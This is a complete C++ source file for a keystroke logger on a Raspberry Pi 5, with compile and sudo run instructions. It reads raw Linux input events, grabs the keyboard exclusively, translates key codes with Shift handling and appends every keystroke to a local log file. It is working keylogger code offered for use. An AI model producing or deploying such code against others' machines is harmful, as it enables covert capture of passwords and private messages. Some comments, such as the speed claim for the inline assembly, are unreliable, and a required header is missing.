/**
 * Raspberry Pi 5 Keyboard Keylogger
 * 
 * This program captures and logs keyboard input events on a Raspberry Pi 5.
 * It uses the Linux input subsystem to read raw keyboard events and translates
 * them to human-readable characters, correctly handling shift key combinations.
 * 
 * Features:
 * - Captures keystrokes from a specific input device
 * - Correctly handles uppercase letters and special symbols with Shift key
 * - Uses ARM assembly for optimized system calls
 * - Logs keystrokes to a file with proper formatting
 * 
 * Usage:
 * 1. Compile with: g++ -o keylogger keylogger.cpp
 * 2. Run with sudo: sudo ./keylogger
 * 3. Keystrokes will be logged to keystrokes.log
 * 
 * Note: You may need to change the DEVICE path to match your keyboard's event number
 * Find your keyboard device by checking: ls -l /dev/input/by-path/
 * 
 * Written and tested on Raspberry Pi 5
 */

 #include <iostream>
 #include <fstream>  // For file handling
 #include <linux/input.h>  // For input event definitions
 #include <fcntl.h>  // For file control options
 #include <unistd.h>  // For POSIX API (close, etc)
 #include <map>  // For keymap storage
 #include <cstring>  // For memset
 
 // Define the input device path - replace with actual keyboard event number
 #define DEVICE "/dev/input/event6"
 
 // Keymap: Maps the Linux key codes to [normal character, shift-modified character]
 std::map<int, std::pair<std::string, std::string>> keymap = {
     {1, {"ESC", "ESC"}}, {2, {"1", "!"}}, {3, {"2", "@"}}, {4, {"3", "#"}}, {5, {"4", "$"}},
     {6, {"5", "%"}}, {7, {"6", "^"}}, {8, {"7", "&"}}, {9, {"8", "*"}}, {10, {"9", "("}}, {11, {"0", ")"}},
     {12, {"-", "_"}}, {13, {"=", "+"}}, {14, {"Backspace", "Backspace"}}, {15, {"Tab", "Tab"}},
     {16, {"q", "Q"}}, {17, {"w", "W"}}, {18, {"e", "E"}}, {19, {"r", "R"}}, {20, {"t", "T"}},
     {21, {"y", "Y"}}, {22, {"u", "U"}}, {23, {"i", "I"}}, {24, {"o", "O"}}, {25, {"p", "P"}},
     {26, {"[", "{"}}, {27, {"]", "}"}}, {28, {"Enter", "Enter"}}, {29, {"Control", "Control"}},
     {30, {"a", "A"}}, {31, {"s", "S"}}, {32, {"d", "D"}}, {33, {"f", "F"}}, {34, {"g", "G"}},
     {35, {"h", "H"}}, {36, {"j", "J"}}, {37, {"k", "K"}}, {38, {"l", "L"}}, {39, {";", ":"}},
     {40, {"'", "\""}}, {41, {"`", "~"}}, {42, {"Shift", "Shift"}}, {43, {"\\", "|"}},
     {44, {"z", "Z"}}, {45, {"x", "X"}}, {46, {"c", "C"}}, {47, {"v", "V"}}, {48, {"b", "B"}},
     {49, {"n", "N"}}, {50, {"m", "M"}}, {51, {",", "<"}}, {52, {".", ">"}}, {53, {"/", "?"}},
     {54, {"Shift", "Shift"}}, {55, {"*", "*"}}, {56, {"Alt", "Alt"}}, {57, {"Space", "Space"}}
 };
 
 /**
  * Function to read input events using ARM Assembly for optimized syscall
  * 
  * This function directly uses ARM64 assembly to perform the read() syscall,
  * which is faster than the standard C library call on Raspberry Pi 5.
  * 
  * The assembly code does the following:
  * - mov x0, fd      : Moves file descriptor to x0 register (first syscall argument)
  * - mov x1, buf     : Moves buffer address to x1 register (second syscall argument)
  * - mov x2, #24     : Sets size to read (24 bytes = size of input_event struct)
  * - mov x8, #63     : Sets syscall number (63 = read syscall in ARM64)
  * - svc #0          : Triggers the syscall
  * - mov result, x0  : Stores the result (bytes read or error code)
  * 
  * @param fd File descriptor of the input device
  * @param event Pointer to the input_event structure to fill
  * @return Number of bytes read or -1 on error
  */
 int read_event(int fd, struct input_event *event) {
     int result;
     asm volatile (
         "mov x0, %[fd]   \n"  // First parameter: file descriptor
         "mov x1, %[buf]  \n"  // Second parameter: buffer address
         "mov x2, #24     \n"  // Third parameter: size to read (input_event struct size)
         "mov x8, #63     \n"  // Syscall number for read() on ARM64
         "svc #0          \n"  // Trigger syscall
         "mov %[res], x0  \n"  // Store result
         : [res] "=r" (result)  // Output operand
         : [fd] "r" (fd), [buf] "r" (event)  // Input operands
         : "x0", "x1", "x2", "x8"  // Clobbered registers
     );
     return result;
 }
 
 /**
  * Function to query the current state of a specific key
  * 
  * This uses ioctl to directly query the hardware state of the keyboard,
  * which is more reliable than tracking key states with events.
  * 
  * @param fd File descriptor of the input device
  * @param key_code Linux key code to check
  * @return true if the key is pressed, false otherwise
  */
 bool get_key_state(int fd, int key_code) {
     // Array to hold key states (1 bit per key)
     char key_states[KEY_MAX/8 + 1];
     memset(key_states, 0, sizeof(key_states));
     
     // Query the device for current key states
     ioctl(fd, EVIOCGKEY(sizeof(key_states)), key_states);
     
     // Check if the specific bit for our key_code is set
     // key_code/8 gives the byte index, key_code%8 gives the bit position within that byte
     return !!(key_states[key_code/8] & (1<<(key_code % 8)));
 }
 
 int main() {
     // Open the keyboard device in read-only mode
     int fd = open(DEVICE, O_RDONLY);
     if (fd == -1) {
         std::cerr << "Error: Cannot open device file!" << std::endl;
         return 1;
     }
     
     // Request exclusive access to device to prevent other processes from reading it
     // This improves reliability of key state detection
     if (ioctl(fd, EVIOCGRAB, 1) < 0) {
         std::cerr << "Warning: Could not get exclusive access to keyboard" << std::endl;
     }
 
     // Open log file in append mode, create if not exists
     std::ofstream logFile("keystrokes.log", std::ios::app);
     if (!logFile.is_open()) {
         std::cerr << "Error: Cannot create log file!" << std::endl;
         close(fd);
         return 1;
     }
 
     // Structure to hold the input event data
     struct input_event event;
     
     std::cout << "Keylogger started. Logging to keystrokes.log" << std::endl;
     
     // Main event loop
     while (true) {
         // Read the next event from the input device
         if (read_event(fd, &event) > 0) {
             // Only process keyboard events (type EV_KEY = 1)
             if (event.type == EV_KEY) {
                 // Check if either shift key is pressed (codes 42 and 54)
                 // This directly queries the hardware state for maximum reliability
                 bool shiftPressed = get_key_state(fd, 42) || get_key_state(fd, 54);
                 
                 // Only process key press events (value = 1)
                 // Ignore key release (value = 0) and key repeat (value = 2)
                 if (event.value == 1) {  
                     // Skip logging the shift keys themselves to avoid cluttering the log
                     if (event.code != 42 && event.code != 54) {
                         if (keymap.find(event.code) != keymap.end()) {
                             // Select the appropriate character based on shift state
                             std::string keyOutput = shiftPressed ? 
                                                    keymap[event.code].second : 
                                                    keymap[event.code].first;
                             
                             // Output to console for debugging
                             std::cout << "Key Pressed: " << keyOutput << std::endl;
                             
                             // Write to log file without newline
                             logFile << keyOutput;
                             logFile.flush();  // Ensure immediate write to file
                         } else {
                             // Handle unknown key codes
                             std::cout << "Key Pressed: Unknown (" << event.code << ")" << std::endl;
                             logFile << "[" << event.code << "]";
                             logFile.flush();
                         }
                     }
                     
                     // Add a newline for Enter key to improve log readability
                     if (event.code == 28) {  // Enter key
                         logFile << std::endl;
                         logFile.flush();
                     }
                 }
             }
         }
     }
     
     // Clean up resources (note: this code is never reached in normal operation)
     ioctl(fd, EVIOCGRAB, 0);  // Release exclusive access
     logFile.close();
     close(fd);
     return 0;
 }